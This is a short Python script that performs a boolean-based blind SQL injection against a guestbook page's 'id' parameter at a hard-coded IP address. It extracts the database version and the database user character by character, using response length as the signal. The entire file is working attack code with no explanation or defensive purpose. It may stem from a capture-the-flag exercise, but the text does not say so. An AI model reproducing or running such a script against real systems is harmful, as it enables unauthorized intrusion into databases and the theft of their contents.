import requests
start=[]
for i in range(1,10):
    start.append(str(i))
payload=['1','2','3','4','5','6','7','8','9','0','.',' ']
def get_dbv():
    result = ''
    for i in start:
        for j in payload:
            url="http://180.97.150.223:82/guestbook/show.php?id=3804 and substring(version(),"+ i + ",1)=" + j
            r = requests.get(url)
            if len(r.text)!=1595:
                print len(r.text),i,j
                result+=j
                print "db version is:",result
def get_user():
    pl=map(chr,range(65,126))
    for j in range(1,22):
        for i in pl:
            url = "http://180.97.150.223:82/guestbook/show.php?id=3799%20and%20substring(user(),"+str(j)+",1)=\""+i+"\""
            r=requests.get(url)
            if len(r.text)!=1595:
                print len(r.text),i
                break
#verbs = requests.options('http://180.97.150.223:82')
#print(verbs.headers)
get_dbv()
get_user()
